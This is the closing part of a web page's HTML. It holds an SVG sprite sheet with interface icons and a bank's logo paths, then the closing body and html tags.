				<path stroke="#80BC00" d="M12 17.52c3.23-7 11.35-12 20.85-12 2.44 0 4.87.35 7.22 1.02 1.5-2.14 3.66-3.73 6.15-4.5.36-.1.75-.02 1.05.2.3.24.48.6.48.97v7.18c2.55 2.25 4.47 5.13 5.6 8.35h2.24c1.32 0 2.4 1.08 2.4 2.42v7.27c0 1.33-1.08 2.42-2.4 2.42h-2.26c-1.26 3.17-3.45 5.9-6.26 7.8l1.94 5.3c.7 1.95-.28 4.1-2.2 4.83-1.93.7-4.07-.28-4.8-2.22l-1.7-4.64c-2.4.74-4.93 1.12-7.47 1.12"></path>
				<path stroke="#80BC00" d="M43 17.5c-.28 0-.5.22-.5.5s.22.5.5.5.5-.22.5-.5-.22-.5-.5-.5"></path>
				<path stroke="#80BC00" d="M19 16c2.6-2.86 6.16-4.64 10-5"></path>
			</g>
		</symbol>
		<symbol id="icon-info" viewBox="0 0 28 28">
			<g stroke="none" transform="translate(-1202 -34) translate(1202 34)">
				<circle cx="14" cy="14" r="14"></circle>
				<circle cx="14" cy="9" r="2" fill="#188765"></circle>
				<path class="inon-info-i" fill="#188765" fill-rule="nonzero" d="M16 21h-4v-9h4z"></path>
			</g>
		</symbol>
		<symbol id="icon-expert" viewBox="0 0 127 127">
			<g fill="none" stroke-width="4">
				<path stroke="#80BC00" d="M92.16 83.97H59.4l-32.75 24.57V83.97H10.27c-4.52 0-8.2-3.66-8.2-8.2v-65.5c0-4.52 3.68-8.2 8.2-8.2h81.9c4.5 0 8.18 3.68 8.18 8.2v65.5c0 4.54-3.67 8.2-8.2 8.2zM112.63 43.03h4.1c4.52 0 8.2 3.66 8.2 8.2v40.93c0 4.52-3.68 8.2-8.2 8.2h-8.2v24.56l-24.56-24.57H63.5"></path>
				<path d="M67.6 32.1v27.3c0 2.27-1.84 4.1-4.1 4.1H38.93c-2.26 0-4.1-1.83-4.1-4.1V32.1M26.65 38.93l24.57-20.47 24.56 20.47"></path>
			</g>
		</symbol>
		<symbol id="logo" viewBox="0 0 174 33">
			<path d="M3.54 3.5H0V2.08c.2-.02.42-.06.63-.06 2.8 0 5.6.02 8.42-.02.6 0 .82.26 1.02.77 2.55 6.56 5.12 13.1 7.7 19.67.08.23.2.45.43.92 2.83-7.24 5.57-14.26 8.32-21.3H36v1.4h-3.46c-.02.42-.05.7-.05.98 0 8.74 0 17.48-.03 26.22 0 .86.26 1.13 1.06 1.06.64-.07 1.3-.02 1.98-.02V33H23.46v-1.3c.78 0 1.56 0 2.34 0 .43 0 .68-.1.67-.63 0-7.78 0-15.55-.02-23.33 0-.05-.04-.1-.13-.33-.2.42-.38.72-.5 1.04-2.94 7.68-5.87 15.37-8.8 23.06-.2.5-.32.9-1.03.9-.7 0-.9-.37-1.1-.92-3-7.73-5.98-15.46-8.97-23.18-.1-.27-.25-.53-.38-.8-.07.03-.14.05-.2.07-.03.3-.05.6-.05.9 0 7.38 0 14.75-.02 22.12 0 .86.2 1.2 1.08 1.12.9-.08 1.8-.02 2.77-.02V33H.7v-1.3c.63 0 1.28-.05 1.9.02.8.07.95-.25.95-1-.02-8.24 0-16.5 0-24.73V3.5z"></path>
			<path transform="translate(93 0)" d="M1.94 8.7c0 1.94 0 3.9 0 5.84-.02.54.1.85.73.84 3.3-.07 6.6-.04 9.9-.2 1.5-.05 2.9-.6 4.04-1.64 2-1.9 2.6-5.35 1.3-8-1.25-2.6-3.63-3.4-6.28-3.52C8.65 1.9 5.68 2 2.7 1.97c-.6 0-.78.2-.77.78.02 1.98 0 3.96 0 5.94zm0 15.2c0 2.1 0 4.2 0 6.3 0 .5.06.85.7.84 3.5-.07 6.98 0 10.46-.2 2.16-.1 4.18-.9 5.43-2.8 1.56-2.38 1.6-4.96.47-7.47-1.15-2.5-3.48-3.47-6.06-3.6-3.38-.2-6.78-.14-10.17-.2-.63-.02-.85.2-.84.83.03 2.1 0 4.2 0 6.3zM.12.5C.44.5.72.48.97.48 4.47.47 7.95.4 11.43.5c2.23.04 4.4.52 6.23 1.9 2.4 1.8 3.06 4.33 2.78 7.1-.28 2.87-1.82 4.9-4.57 5.97-.33.13-.66.26-1.26.5.54.17.82.27 1.1.35 3.52.94 5.7 3.48 5.9 6.67.33 4.83-1.98 7.55-5.26 8.62-1.44.47-3 .73-4.53.77-3.65.1-7.32.03-11 .03-.2 0-.4-.04-.68-.06V.5z"></path>
			<path transform="translate(115 9)" d="M16 13.86c0-.56-.04-.98 0-1.4.07-.72-.24-.96-.94-.9-1.76.12-3.55.07-5.27.37-1.76.3-3.52.77-5.15 1.47-1.86.8-2.64 2.48-2.54 4.47.1 2.04 1.18 3.47 3.07 4.27 2.7 1.12 6.48.4 8.55-1.66 1.9-1.87 2.35-4.23 2.27-6.62M3.1 6.84c-.55-.17-1-.3-1.52-.47.7-2.1 1.97-3.6 3.87-4.57C8.02.5 10.7.43 13.38 1.4c2.66.97 3.92 3.15 4.12 5.82.23 2.98.18 5.98.2 8.98.04 2.36.02 4.73.02 7.16h-1.74v-3.92c-.1-.02-.2-.04-.3-.06-.17.28-.37.55-.55.84-2.6 4.3-8.8 4.62-12.13 2.5-3.38-2.14-3.92-8.04.5-10.35 2.34-1.22 4.87-1.63 7.45-1.82 1.4-.1 2.8-.16 4.22-.2.6 0 .88-.23.82-.85-.1-1-.1-2.04-.3-3.03-.56-2.7-2.36-4.15-5.12-4.3-3.55-.2-6.07 1.26-7.48 4.67"></path>
			<path transform="translate(156 1)" d="M6.97 19.4c-.23.2-.43.36-.6.55-1.4 1.5-2.8 2.97-4.15 4.5-.24.27-.4.73-.4 1.1-.06 1.92-.03 3.84-.03 5.85H.12V-.42h1.64v22.76c.08.04.15.07.22.1.3-.28.62-.56.9-.88 3.57-3.93 7.1-7.9 10.72-11.76.42-.44 1.4-.37 2.12-.53.05.1.1.2.13.28-1 1.12-2.02 2.24-3.03 3.36-1.38 1.52-2.73 3.04-4.14 4.5-.48.5-.5.84-.13 1.38 2.35 3.37 4.67 6.75 7 10.13.55.8 1.1 1.62 1.7 2.5-1.16.18-1.96.16-2.68-.93-2.36-3.6-4.87-7.12-7.32-10.67-.08-.12-.17-.23-.3-.4"></path>
			<path d="M137.66 10.65v5.16c.68-1.08 1.18-2 1.8-2.83 2.3-3.14 7-3.93 10-1.7 1.62 1.2 2.42 3 2.47 5 .12 5.14.05 10.28.05 15.42 0 .07-.04.16-.07.3h-1.5v-1c0-4.35.04-8.7 0-13.05-.02-1.04-.15-2.1-.45-3.1-.9-2.93-3.02-3.48-5.12-3.4-4.56.16-6.97 4.33-7.14 8.4-.17 3.66-.06 7.35-.06 11.03 0 .34 0 .7 0 1.1H136V10.66h1.66z"></path>
			<path d="M137.66 10.65v5.16c.68-1.08 1.18-2 1.8-2.83 2.3-3.14 7-3.93 10-1.7 1.62 1.2 2.42 3 2.47 5 .12 5.14.05 10.28.05 15.42 0 .07-.04.16-.07.3h-1.5v-1c0-4.35.04-8.7 0-13.05-.02-1.04-.15-2.1-.45-3.1-.9-2.93-3.02-3.48-5.12-3.4-4.56.16-6.97 4.33-7.14 8.4-.17 3.66-.06 7.35-.06 11.03 0 .34 0 .7 0 1.1H136V10.66h1.66z"></path>
			<path d="M50.86 30.34c-2.16.23-4.34.33-6.23-1.05-1.63-1.2-2.58-2.76-2.6-4.75-.02-1.07.02-2.2.34-3.2.25-.8.93-1.5 1.47-2.2.27-.34.6-.36.96 0 3.25 3.14 6.53 6.27 9.8 9.4.07.1.13.2.24.36-1.22.93-2.58 1.3-3.98 1.44zM48.8 4.94c1.93.02 3.33 1.5 3.38 3.57 0 .2 0 .4 0 .6 0 2.42-1 4.32-3.02 5.7-.48.33-.82.4-1.27-.1-1.64-1.75-2.66-3.73-2.55-6.18.1-2.13 1.47-3.6 3.45-3.58zM60.5 2v8.06h1.6c.75-6.03 4.4-7.2 8.4-6.5.02.13.04.28.04.42 0 8.82 0 17.64 0 26.47 0 .08.04.2 0 .25-.17.2-.36.5-.54.5-.97.02-1.96.08-2.9-.08-3.17-.54-4.92-3-7.14-5 1.54-1.8 2.16-3.9 2.64-6.05.28-1.22 1.04-2.1 2.3-2.32 1-.17 1.14-.6.88-1.45h-9.1v1.22c1.82.1 3.28.72 3.64 2.63.36 1.84-.48 3.3-1.68 4.76-2.95-2.8-5.8-5.5-8.76-8.3.46-.2.8-.33 1.1-.47.97-.47 1.98-.9 2.9-1.44 2.1-1.27 3.4-3.03 3.1-5.56-.28-2.62-1.88-4.26-4.38-5.06-1.78-.58-3.6-.65-5.47-.43-3.27.38-6 2.44-6.7 5.3-.7 2.84-.06 5.4 1.88 7.65.22.25.43.5.62.7-1.44.83-2.85 1.5-4.1 2.37-3.95 2.75-3.6 8.8.1 11.26 2.5 1.66 5.32 2.1 8.22 2.07 3.1-.04 6.03-.83 8.64-2.57.2-.12.7-.08.86.07 1.57 1.5 3.48 2.07 5.62 2.07 5.73 0 11.47 0 17.2 0 .32 0 .63-.04.92-.05.2-1.27.2-1.3-.95-1.3-.44 0-.9-.04-1.32 0-.86.12-1.15-.17-1.15-1.07.04-8.25.03-16.5.03-24.75 0-2.02 0-2.02 2.08-2 2.88 0 4.92 1.44 5.8 4.13.26.84.42 1.7.62 2.53H87V2H60.5z"></path>
		</symbol>
		<symbol id="nav-logo" viewBox="0 0 2426.5 449.2">
			<g fill-rule="evenodd">
				<g fill="#aaacae">
					<path d="M207.8 58.5c56.1-29.9 97.7-44.4 126.7-43.5l-10.6-4.8C304.5-.4 281.3-2.4 257.2 2.5 236.9 7.3 208.8 17 175 34.4L38.7 108.8c-8.7 4.8-11.6 9.7-11.6 14.5l1.9 11.6 14.5 12.6zM0 205.5c0 26.1 7.7 43.5 22.2 51.2l96.7 53.2 58-2.9c27.1-4.8 55.1-14.5 82.2-29L36.7 157.1c-9.6-4.8-16.4-11.6-19.3-16.4-2.9-7.7-2.9-14.5 0-20.3C5.8 130.1 0 145.5 0 169.7zM104.4 181.3l164.4-88.9c53.1-29 99.5-41.6 137.2-38.7l-40.6-20.3c-36.7-3.9-79.3 7.7-128.6 34.8L65.7 160zm232 135.3c-56.1 31-98.6 45.5-125.7 43.5l9.7 4.9c21.3 11.6 43.5 12.6 67.7 7.7 21.2-4.8 50.2-15.5 84.1-33.8l136.3-72.5c6.8-4.9 9.7-9.7 11.6-15.5l-1.9-9.6-14.5-13.6zM286.1 97.2L508.5 218c8.7 3.9 14.5 8.7 19.3 16.5s4.9 14.5 2 21.3c11.6-9.7 16.4-26.1 16.4-50.3v-35.8c0-27-6.8-43.5-21.3-51.2l-96.6-53.2-60 2.9c-25.1 4.8-53.2 14.5-82.2 29zM179.8 342.8c35.8 2.8 79.3-9.7 129.5-37.8l170.2-89.9-38.7-21.2-165.3 88.9c-53.2 27.1-98.6 40.6-135.3 38.7z"></path>
				</g>
				<path d="M687.3 104l-4.8 2.9h-5.8l-1.9 4.8 4.8 21.3 29 94.7 45.4-117c1-4.8 2.9-8.7 4.9-8.7l5.8 11.6 47.4 113.1h.9l29-100.5 1.9-12.6c0-4.8-2.9-6.7-9.6-6.7l-4.9-2.9 6.8-2h39.6l4.9 2-1 2.9H870c-1.9 1.9-6.7 9.6-11.6 24.1L813 265.4l-7.7 10.7c-1.9 0-2.9-3-6.8-10.7l-46.4-113.1a1041.6 1041.6 0 0 1-45.4 111.2l-5.8 12.6c-2 0-4.9-3-6.8-9.7l-46.4-141.1c-3.8-8.8-6.7-14.5-8.7-16.5l-9.6-1.9-4.9-2.9 6.8-2h51.2zm258.2 16.4v136.3c1.9 6.8 4.8 9.7 9.6 9.7l11.6 1.9 2.9 1.9-2.9 2.9h-64.8a3.1 3.1 0 0 1-2.9-2.9l2.9-1.9 7.8-1.9c3.9 0 4.8-2.9 6.7-9.7l2-136.3c-2-8.7-4.9-11.6-9.7-13.5h-6.8c-2.9 0-4.8-1-4.8-2.9l4.8-2H960l4.8 2-2.9 2.9h-8.7c-4.8 1.9-7.7 4.8-7.7 13.5zm62.8-18.4h60.9l4.8 2c0 1.9-.9 2.9-4.8 2.9h-7.7c-4.9 1.9-6.8 4.8-7.8 13.5v87c0 30 1 46.4 2.9 48.3 4.9 3 14.5 4.9 27.1 4.9 14.5 0 23.2-1.9 28-6.8l7.8-16.4 1.9 3.9-3.9 25.1c-.9 4.8-5.8 6.7-14.5 6.7h-92.8l-4.8-2.8 2.9-2 7.7-1.9c4.9 0 6.8-2.9 6.8-10.6l1.9-135.4c-1.9-8.7-4.8-11.6-9.6-13.5h-8.7a3.1 3.1 0 0 1-2.9-2.9zm174 58l-12.6 100.6c0 2.9 1 4.8 5.8 5.8l9.7 1.9 3.9 1.9c0 1-2 2.9-6.8 2.9h-45.4l-4.9-2.9 4.9-1.9 6.7-1.9c4.9 0 7.8-4.9 9.7-15.5l22.2-148.9c0-2.9 2-4.8 3.9-4.8l5.8 6.8 61.9 127.6L1308 102l4.8-4.8 4.8 6.8 19.4 140.1c1.9 12.6 6.7 21.3 11.6 22.3l14.5 1.9 2.9 1.9c0 1-2 2.9-4.9 2.9l-46.3-1.9c-3.9 0-4.9-1-6.8-2.9l2.9-1.9v-9.7l-12.6-99.6h-1.9L1248 260.6l-7.7 10.6-7.7-10.6zm268.8-53.1h-5.8c-4.9 1.9-8.7 4.8-9.7 13.5l1 136.3c1.9 6.8 3.8 9.7 8.7 9.7l10.6 1.9 4.8 1.9c0 1-.9 2.9-4.8 2.9H1393c-2.9 0-4.8-1.9-4.8-2.9l3.9-1.9 7.7-1.9c2.9 0 4.9-2.9 6.8-9.7V120.4c0-8.7-1.9-11.6-6.8-13.5h-9.7l-1.9-2.9 4.9-2h57l4.8 2zm74.4 40.6l1.9 93.8c1 15.4 2.9 24.1 7.8 25.1l12.5 1.9 1.9 2-2.8 2.8h-53.2l-4.9-2.8 2.9-2 11.6-1.9c4.9-1 5.8-9.7 5.8-27.1l2-133.4c0-4.8 1.9-8.7 2.9-8.7l8.7 8.7 118.9 121.8h1.9l-1.9-99.5c-1.9-11.7-2.9-17.4-7.8-19.4l-13.5-1.9a3.2 3.2 0 0 1-2.9-2.9l6.8-1.9h48.3l5.8 1.9-4.8 2.9h-5.8c-4.9 1.9-8.7 8.7-8.7 19.3l-2.9 142.1-2.9 6.8-6.8-4.8zm204.9 31.9c0 24.1 5.8 45.4 20.3 59.9 14.5 16.5 33.9 24.2 58 24.2l18.4-1.9c2.9-1 4.8-2.9 4.8-7.8v-48.3c0-6.8-3.8-11.6-9.6-12.6h-8.7c-2.9 0-4.9-1.9-4.9-3.9l6.8-.9h58l4.8.9-2.9 3.9h-4.8c-6.8 1-9.7 4.9-9.7 12.6v51.2c0 4.9-1.9 6.8-3.8 8.7-12.6 7.8-30 10.7-54.2 10.7-30.9 0-55.1-5.8-72.5-20.3-21.3-16.5-30.9-38.7-30.9-67.7 0-33.8 12.5-58 38.6-74.4q24.8-14.5 60.9-14.5l38.7 2.9 18.4 3.8 2.9 2.9v35.8l-2.9 4.8-1.9-1.9c-2-7.7-3-14.5-7.8-19.3q-17.4-17.4-52.2-17.4c-17.4 0-31.9 4.8-43.5 14.5-14.5 10.6-20.3 28.9-20.3 54.1zm273.6-63.8h-29l1.9 140.2c1 7.7 4.9 10.6 9.7 10.6l10.7 1.9 3.8 2-3.8 2.8h-63.9c-3.8 0-4.8-1.9-4.8-2.8l2.9-2 7.8-1.9c4.8 0 6.7-2.9 6.7-10.6l1.9-140.2h-33.8c-11.6.9-19.3 2.9-21.3 5.8l-4.8 8.7-1.9 2.9-2.9-2.9 4.8-26.1 2.9-4.9 9.7 2.9h127.6l6.7-.9 1 4.8v25.2l-2.9 3.8-1.9-3.8v-2.9c-1-7.8-9.7-12.6-27.1-12.6zm60 130.5c15.4 20.3 38.6 30 68.6 30 28 0 50.3-9.7 67.7-27.1s26.1-38.7 26.1-65.8-7.8-47.3-26.1-61.8c-14.5-14.5-36.8-22.3-65.8-22.3-30.9 0-53.1 9.7-70.5 29-14.5 17.4-21.3 36.8-21.3 60s6.7 41.5 21.3 58zm9.6-66.7c0-46.4 17.4-68.7 54.1-68.7 19.4 0 35.8 5.8 47.4 20.3s19.4 35.8 19.4 61.9c0 48.4-18.4 72.5-52.2 72.5a65.4 65.4 0 0 1-51.3-24.1c-11.6-16.5-17.4-37.8-17.4-61.9zm198.2-31.9l2.9 93.8c1.9 15.4 2.9 24.1 7.8 25.1l13.5 1.9 2.9 2c0 .9-1.9 2.8-4.9 2.8h-53.1c-2.9 0-4.9-1.9-4.9-2.8l2.9-2 11.6-1.9c4.9-1 6.8-9.7 6.8-27.1l1-133.4c0-4.8 1.9-8.7 3.8-8.7l7.8 8.7 120.8 121.8-1.9-99.5c0-11.7-2.9-17.4-7.8-19.4l-12.5-1.9-3.9-2.9 6.8-1.9h50.2l4.9 1.9-4.9 2.9h-6.7c-4.9 1.9-7.7 8.7-7.7 19.3l-2 142.1c0 4.9-1.9 6.8-4.8 6.8s-2.9-1.9-6.8-4.8l-120.8-122.8zm-1624.1 174l5.8 1.9h81.2l15.5-1.9 1.9 2.9v19.3l-1.9 3.9-1-3.9-1.9-.9c0-6.8-6.8-9.7-19.4-9.7l-19.3-1.9v103.4c1.9 4.8 2.9 7.7 6.8 9.7h7.7l2.9.9-2.9 2h-46.4l-3.9-2 3.9-.9h5.8l4.8-9.7V331.2l-24.1 1.9c-9.7 0-14.5.9-15.5 4.8l-3.9 4.9-.9.9-2-.9 3-19.4zm130.5 4.8c4.8 1.9 7.7 4.9 7.7 9.7v98.6l-4.8 9.7h-6.7l-3 .9 4.9 1.9h43.5l2.9-1.9-1-.9H813a20.9 20.9 0 0 1-7.7-9.7v-37.7l1.9-1h14.5l2.9 1 16.5 23.2c9.6 12.6 17.4 20.3 22.2 24.2l17.4 2.9h14.5l3.9-2-2-.9h-4.8c-7.7-2-12.6-6.8-17.4-11.6l-35.8-43.5c14.5-11.6 21.3-24.2 21.3-36.8 0-9.6-3.9-18.3-11.6-23.2s-17.4-5.8-30.9-5.8h-48.4l3.9 2.9zm38.7 4.9c15.4 0 24.1 9.6 24.1 29 0 12.5-3.8 21.2-9.6 24.1l-11.6 2.9-12.6-.9-1.9-3.9v-49.3l1.9-1.9zm77.3-7.8h46.4l-1.9 2.9h-4.8c-4.9 1.9-5.8 4.9-5.8 9.7v56.1c0 21.2 4.8 33.8 12.5 40.6a27.3 27.3 0 0 0 19.4 7.7c9.6 0 17.4-2.9 24.1-9.7 4.9-5.8 7.8-19.3 7.8-39.6V336c0-4.8-1-7.8-5.8-9.7h-6.8l-1.9-2.9h43.5l-2.9 2.9h-4.9c-2.9 1.9-4.8 4.9-4.8 9.7l-2 51.2c0 24.2-4.8 40.6-15.4 50.3-8.7 7.7-19.4 11.6-33.9 11.6s-28-3.9-35.7-11.6c-9.7-7.8-14.5-22.2-14.5-43.5v-58c-2-4.8-2.9-7.8-7.8-9.7h-6.7l-2.9-2.9zm170.2 20.3c0 8.7 6.7 16.5 18.3 24.2l4.9 3.9c17.4 14.4 25.1 27 25.1 41.5 0 11.6-4.8 21.3-14.5 29-7.7 4.8-15.5 6.8-25.1 6.8l-24.2-4.9c-1.9 0-3.9-1.9-3.9-4.8v-21.3l3.9-4.8v1.9l1 9.7c3.8 10.6 11.6 15.5 24.1 15.5 14.6 0 21.3-5.8 21.3-19.4 0-7.7-4.8-17.4-16.4-25.1l-5.8-6.8c-16.5-11.6-24.2-24.1-24.2-38.6 0-7.8 2.9-16.5 10.6-21.3s16.5-7.8 28.1-7.8l20.3 2 1.9 1v19.3l-2.9 6.7v-2.9l-4.8-11.6c-3.9-4.8-9.7-7.7-18.4-7.7-12.6 0-19.3 4.9-19.3 15.5zm79.2-20.3h93.8l4.8-1.9v22.2l-1.9 3.9-1.9-3.9v-.9c0-6.8-5.8-9.7-19.4-9.7l-20.3-1.9 1 103.4c0 4.8 1.9 7.7 6.8 9.7h7.7l1.9.9-1.9 1.9h-46.4l-2.9-1.9 1-.9h6.7c2-2 2.9-4.9 4.9-9.7V331.2l-24.2 1.9c-7.7 0-14.5.9-16.4 4.8l-2.9 4.9-2 .9v-.9l2-19.4 2.9-1.9z"></path>
			</g>
		</symbol>
		<symbol id="icon-question-mark" viewBox="0 0 16 16">
			<path transform="translate(-97 0)" d="M97 8c0 4.42 3.58 8 8 8s8-3.58 8-8-3.58-8-8-8-8 3.58-8 8zm5.33-1.83c0-1.33 1-2.46 2.3-2.64 1.32-.18 2.58.64 2.94 1.92.36 1.28-.28 2.63-1.5 3.16-.25.12-.4.36-.4.62 0 .37-.3.67-.67.67-.37 0-.67-.3-.67-.68 0-.8.47-1.5 1.2-1.83.6-.28.93-.95.75-1.6-.18-.63-.8-1.04-1.46-.95-.66.1-1.15.65-1.15 1.32 0 .37-.3.67-.67.67-.37 0-.67-.3-.67-.67zm1.67 5.5c0-.56.45-1 1-1s1 .44 1 1c0 .55-.45 1-1 1s-1-.45-1-1z"></path>
		</symbol>
		<symbol id="icon-person" viewBox="0 0 15 15">
			<g fill="none">
				<path fill="#007B56" fill-rule="nonzero" d="M7.5 0C3.36 0 0 3.36 0 7.5 0 11.64 3.36 15 7.5 15c4.14 0 7.5-3.36 7.5-7.5C15 3.36 11.64 0 7.5 0zm3.83 11.2c-.08.12-.23.2-.4.2H4.07c-.16 0-.3-.08-.4-.2-.08-.15-.1-.32-.02-.46.7-1.5 2.2-2.45 3.86-2.45 1.65 0 3.15.94 3.86 2.44.07.14.06.3-.03.45zM7.5 2.7c1.28 0 2.3 1.03 2.3 2.3 0 1.3-1.02 2.32-2.3 2.32-1.28 0-2.3-1.03-2.3-2.3 0-1.3 1.02-2.32 2.3-2.32z"></path>
			</g>
		</symbol>
		<symbol id="icon-email" viewBox="0 0 15 10">
			<g fill="none">
				<path fill="#007B56" fill-rule="nonzero" d="M6.95 6.6c.3.3.8.3 1.1 0L14.1.54c.1-.08.12-.2.08-.32-.04-.1-.13-.2-.25-.2C13.87 0 13.8 0 13.75 0H1.25c-.06 0-.12 0-.18 0C.95.04.85.1.82.23.78.34.82.46.9.54L6.94 6.6zM14.93 1.15c-.04-.02-.1 0-.13.02l-3.87 3.87c-.06.07-.06.16 0 .23l3.15 3.15c.12.12.17.3.13.45-.03.17-.16.3-.32.34-.17.05-.34 0-.46-.12l-3.15-3.15c-.03-.03-.07-.05-.1-.05-.05 0-.1.02-.12.05L8.72 7.26c-.68.67-1.76.67-2.43 0L4.94 5.93c-.06-.06-.16-.06-.22 0L1.58 9.08c-.18.18-.48.18-.66 0-.18-.2-.18-.48 0-.66l3.15-3.15c.06-.06.06-.16 0-.22L.2 1.17c-.04-.03-.1-.04-.13-.02-.04 0-.07.05-.07.1v7.5C0 9.45.56 10 1.25 10h12.5c.7 0 1.25-.56 1.25-1.25v-7.5c0-.05-.03-.1-.07-.1z"></path>
			</g>
		</symbol>
		<symbol id="icon-circle" viewBox="0 0 15 15">
			<g transform="translate(-111 0)">
				<rect width="15" height="15" x="111" rx="7.5"></rect>
			</g>
		</symbol>
		<symbol id="icon-business" viewBox="0 0 83 77">
			<g fill="none" stroke-width="3">
				<path stroke="#7EBE00" d="M29.14 13.98V10.2c0-1.46 1.2-2.66 2.66-2.66h19.4c1.46 0 2.66 1.2 2.66 2.66v3.78h5.9V7.2c0-2.68-2.2-4.9-4.9-4.9h-26.7c-2.7 0-4.92 2.22-4.92 4.9V14h5.9z"></path>
				<path d="M78.2 49.5l-36.86 6.14L4.8 49.5c-1.73 0-3.14-1.4-3.14-3.1V17.1c0-1.73 1.4-3.12 3.15-3.12h73.4c1.73 0 3.14 1.4 3.14 3.1v29.3c0 1.73-1.4 3.13-3.15 3.13z"></path>
				<path d="M77.53 50.03L40.88 56.5l-35.9-6.4V72.4c0 1.43 1.1 2.6 2.47 2.6h68.1c1.36 0 2.47-1.17 2.47-2.6v-22.4c-.16.03-.33.05-.5.05z"></path>
				<path stroke="#7EBE00" d="M43.82 63.97h-4.64c-1.46 0-2.66-1.08-2.66-2.4v-10.2c0-1.3 1.2-2.4 2.66-2.4h4.64c1.46 0 2.66 1.1 2.66 2.4v10.2c0 1.32-1.2 2.4-2.66 2.4z"></path>
			</g>
		</symbol>
		
			
			
</body>


</html>